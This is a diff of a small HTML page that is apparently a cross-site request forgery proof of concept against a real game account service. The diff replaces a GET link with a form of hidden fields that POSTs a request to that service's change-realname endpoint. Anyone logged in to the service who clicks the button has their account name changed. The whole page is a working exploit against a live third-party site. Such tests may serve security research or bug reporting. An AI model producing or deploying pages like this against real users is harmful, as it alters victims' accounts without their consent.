@@ -1,9 +1,20 @@
 <!doctype html>
 <html>
 <body>
-  <a href="https://account.arena.net/modals/change-realname.json?realname=CSRF-GET-TEST"
-     target="_blank">
-    Test
-  </a>
+
+<form action="https://account.arena.net/modals/change-realname.json"
+      method="POST">
+
+    <input type="hidden"
+           name="_formName"
+           value="change-realname">
+
+    <input type="hidden"
+           name="realname"
+           value="CSRF-TEST-ACCOUNT-2">
+
+    <button type="submit">Test</button>
+</form>
+
 </body>
 </html>
